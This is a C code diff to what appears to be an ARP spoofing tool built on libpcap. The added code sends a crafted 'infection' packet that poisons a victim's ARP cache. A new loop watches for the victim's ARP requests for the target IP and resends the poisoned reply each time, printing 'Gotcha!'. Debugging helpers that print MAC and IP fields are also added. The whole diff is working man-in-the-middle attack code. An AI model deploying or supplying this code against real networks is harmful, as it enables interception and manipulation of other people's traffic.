@@ -9,9 +9,8 @@ void getMymac(unsigned char MAC_str[ETH_ALEN], char* interface);
 void getMyip(unsigned char IP_ADDR[4], char* dev);
 void writeArpHeaderFrame(unsigned char* packet,int opcode);
 int checkRightPacket(unsigned char* packet, unsigned char* smac, unsigned char* dmac);
-
-//int checkRightPacket
-
+void printPinfo(struct packetinfo *pinfo);
+char *macToStr(unsigned char *addr, char *dest);
 
 
 int main(int argc, char *argv[])
@@ -37,15 +36,14 @@ int main(int argc, char *argv[])
 
     // Get sender MAC
     /* Open the session in promiscuous mode */
-    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    struct pcap_pkthdr *header;
+    const unsigned char *recieve_packet;
+    int retValue;
+    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == NULL) {
         fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
         return(2);
     }
-
-    struct pcap_pkthdr *header;
-    const unsigned char *recieve_packet;
-    int retValue;
     while(1)
     {
         if(pcap_sendpacket(handle,(const unsigned char*)packet,sizeof(packet)) != 0){
@@ -55,7 +53,7 @@ int main(int argc, char *argv[])
         retValue = pcap_next_ex(handle, &header, &recieve_packet);
         if( retValue < 0){
             puts("Error grabbing packet\n");
-            continue;
+            break;
         }
         if( retValue == 0 ){
             puts("Timeout");
@@ -74,10 +72,39 @@ int main(int argc, char *argv[])
         }
     }
 
-    unsigned char infectPacket[60];
+    // Make Infection packet
+    unsigned char infectPacket[60]={0,};
     makeInfectPacket(infectPacket,dev,senderIP,senderMAC,targetIP);
-    if(pcap_sendpacket(handle,(const unsigned char*)infectPacket,sizeof(packet)) != 0){
+    printPacket(infectPacket, sizeof(infectPacket));
+
+    // First Infection
+    if(pcap_sendpacket(handle,(const unsigned char*)infectPacket,sizeof(infectPacket)) != 0){
         fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+    }
+
+    // Do arp_spoof
+    while(1)
+    {
+        retValue = pcap_next_ex(handle, &header, &recieve_packet);
+        if( retValue < 0){
+            puts("Error grabbing packet\n");
+            break;
+        }
+        if( retValue == 0 )
+            continue;
+        else
+        {
+            struct packetinfo pinfo;
+            updatePacketinfo(&pinfo,recieve_packet);
+            if( !memcmp(pinfo.eth_sha,senderMAC,ETH_ALEN) && pinfo.eth_proto == ETHERTYPE_ARP && \
+                    !memcmp(pinfo.ar_tip,targetIP,4))
+            {
+                puts("Gotcha!");
+                if(pcap_sendpacket(handle,(const unsigned char*)infectPacket,sizeof(infectPacket)) != 0){
+                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+                }
+            }
+        }
     }
     return 0;
 }
@@ -155,6 +182,7 @@ void makeInfectPacket(unsigned char* packet, char* interface, unsigned char* sen
 
 void updatePacketinfo(struct packetinfo* pinfo, const unsigned char* packet){
     memcpy(pinfo,packet,ETH_HLEN);
+    pinfo->eth_proto=htons(pinfo->eth_proto);
     struct arphdr* arph = (struct arphdr*)(packet+ETH_HLEN);
     pinfo->ar_op=htons(arph->ar_op);
     struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+ETH_HLEN+sizeof(struct arphdr));
@@ -164,7 +192,23 @@ void updatePacketinfo(struct packetinfo* pinfo, const unsigned char* packet){
     memcpy(pinfo->ar_tip,arpb->ar_tip,4);
 }
 
+char *macToStr(unsigned char* addr, char *dest){
+    sprintf(dest, "%02X:%02X:%02X:%02X:%02X:%02X", addr[0],addr[1], addr[2], addr[3], addr[4], addr[5]);
+    return dest;
+}
 
+void printPinfo(struct packetinfo* pinfo)
+{
+    char buf[20];
+    printf("ETH SRC MAC : %s\n",macToStr(pinfo->eth_sha,buf));
+    printf("ETH DST MAC : %s\n",macToStr(pinfo->eth_dha,buf));
+    printf("ETH PROTOCO : 0x%04x\n",pinfo->eth_proto);
+
+    printf("ARP SND MAC : %s\n",macToStr(pinfo->ar_sha,buf));
+    printf("ARP SND IP  : %s\n",inet_ntoa(*((struct in_addr*)(&pinfo->ar_sip))));
+    printf("ARP TGT MAC : %s\n",macToStr(pinfo->ar_tha,buf));
+    printf("ARP TGT IP  : %s\n",inet_ntoa(*((struct in_addr*)(&pinfo->ar_tip))));
+}
 
 /* ARP header frame
  * Hardware type : Ethernet(1)  Protocol type : IPv4(0x0800)
